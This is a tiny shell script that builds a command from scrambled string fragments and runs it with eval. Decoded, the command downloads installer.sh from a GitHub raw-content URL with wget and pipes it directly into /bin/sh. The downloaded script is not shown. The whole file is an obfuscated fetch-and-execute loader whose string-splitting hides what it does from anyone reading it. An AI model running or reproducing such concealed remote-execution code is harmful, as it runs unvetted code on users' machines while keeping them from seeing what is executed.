z="
";Vz='/sh';Dz='/raw';Nz='el/m';Lz='37/t';Sz=' -O ';Cz='ps:/';Qz='alle';Fz='hubu';Ez='.git';Uz='/bin';Bz=' htt';Mz='span';Hz='onte';Az='wget';Gz='serc';Tz='- | ';Kz='mil2';Oz='ain/';Pz='inst';Iz='nt.c';Rz='r.sh';Jz='om/e';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz"